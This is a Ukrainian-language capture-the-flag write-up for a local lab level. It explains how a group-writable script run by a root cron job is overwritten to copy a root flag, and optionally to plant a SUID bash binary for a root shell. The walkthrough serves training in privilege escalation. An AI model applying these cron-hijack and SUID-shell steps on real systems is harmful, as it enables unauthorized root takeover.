## Write-up: T13 «Коронація» (Vertical PrivEsc → Root через Cron)

### Ціль
Ти вже офіцер (**sir_lancelot**). Потрібно отримати **root-виконання через Cron**, щоб забрати **Root Flag (“Корона”)** і здати його через **поле вводу флага** на сторінці рівня.

---

## 0) Що є на рівні
- Веб-сторінка: `http://localhost:8080/`
  - Вбудований **термінал** (працює всередині контейнера)
  - Поле **“Введи флаг”** → перевірка через `/api/check`

---

## 1) Старт і лор-натяк
Переконайся, що ти офіцер, і прочитай записку:

- `whoami`
- `cat ~/tower_note.txt`

Записка каже, що **Король прокидається щохвилини**, і що треба дивитися **/etc/cron.*`**.

---

## 2) Знайти, що саме крутить “Годинникова Вежа”
Перевір cron-конфіги:

- `ls -la /etc/cron.d`
- `cat /etc/cron.d/king_winder`

Там буде правило виду:

- `* * * * * root /usr/local/bin/king_winder >> /var/log/king_winder.log 2>&1`

Перевір лог, щоб бачити “тік”:

- `tail -n 50 /var/log/king_winder.log`

---

## 3) Розкрутити ланцюжок виконання до редагованого місця
Подивись, що робить runner:

- `cat /usr/local/bin/king_winder`

У ньому буде виклик механізму:

- `bash /opt/clocktower/winder.sh`

Перевір права на “механізм” і свої групи:

- `ls -l /opt/clocktower/winder.sh`
- `id`

Очікування по задуму:
- файл належить **root:clock**
- має права типу **775** (`-rwxrwxr-x`) → група **clock** може редагувати
- `sir_lancelot` входить у групу **clock** (видно в `id`)

**Це і є вразливість:** root-cron запускає скрипт, який офіцер може змінити → класичний **Vertical PrivEsc**.

---

## 4) Експлуатація (безпечний варіант: просто витягнути Root Flag)
Зроби резервну копію, щоб легко відкотитися:

- `cp /opt/clocktower/winder.sh /tmp/winder.bak`

Перезапиши `winder.sh` так, щоб при root-запуску він копіював флаг у твій home:

- `cat > /opt/clocktower/winder.sh <<'EOF'`
  - `#!/usr/bin/env bash`
  - `echo "[clock] winding mechanism: $(date -u +%F_%T)"`
  - `cp /root/IRON_CROWN.flag /home/sir_lancelot/IRON_CROWN.flag`
  - `chown sir_lancelot:sir_lancelot /home/sir_lancelot/IRON_CROWN.flag`
  - `chmod 644 /home/sir_lancelot/IRON_CROWN.flag`
- `EOF`

Важливо:
- **не треба** змінювати права/власника `winder.sh` — вони вже налаштовані
- ти змінюєш **лише вміст**, а **Cron** виконає це як **root** на наступному тіку

---

## 5) Забрати “Корону”
Cron спрацьовує **щохвилини**. Дочекайся наступного тіку:

- `tail -n 50 /var/log/king_winder.log`

Перевір, що флаг з’явився:

- `ls -la ~/IRON_CROWN.flag`
- `cat ~/IRON_CROWN.flag`

Це і є **Root Flag / Корона**.

---

## 6) Здати флаг через веб-форму
1) Відкрий `http://localhost:8080/`
2) Встав значення з `~/IRON_CROWN.flag` у поле
3) Натисни **“Перевірити”**
4) Має з’явитися: **✅ Вірно. Корона твоя.**

---

## 7) Опційно: отримати root-shell (як “абсолютна влада”)
Якщо хочеш не тільки флаг, а й root-доступ, можна замість копіювання створити **SUID-bash** (демонстрація повного захоплення).

> Це “сильніший” варіант, але його легко відкотити, якщо після проходження повернути `winder.sh` назад.

Заміни `winder.sh` на:

- `cat > /opt/clocktower/winder.sh <<'EOF'`
  - `#!/usr/bin/env bash`
  - `echo "[clock] winding mechanism: $(date -u +%F_%T)"`
  - `cp /bin/bash /tmp/kingbash`
  - `chmod 4755 /tmp/kingbash`
- `EOF`

Після наступного тіку Cron:

- `ls -l /tmp/kingbash` *(має бути SUID-біт)*
- `/tmp/kingbash -p`
- `whoami`
- `cat /root/IRON_CROWN.flag`

---

## 8) Відкат / “не ламай механізм”
Щоб повернути вежу “в норму”:

- `cp /tmp/winder.bak /opt/clocktower/winder.sh`

Якщо робив SUID-бінарник:

- `rm -f /tmp/kingbash`

---

## Чому це працює (коротко)
- Cron-job виконується як **root**
- Він запускає `/usr/local/bin/king_winder`
- Той викликає `/opt/clocktower/winder.sh`
- `winder.sh` **writable** для офіцера через групу **clock**
- Отже, офіцер підміняє код → Cron виконує його від root → **PrivEsc**

---

## Додаткові підказки для гравця (якщо хочеш вставити в лор/UI)
- “Вежа живе за розкладом — шукай сувої у `/etc/cron.*`”
- “Той, хто контролює механізм заводки, контролює і Короля”
- “Сліди тіку — у `king_winder.log`”
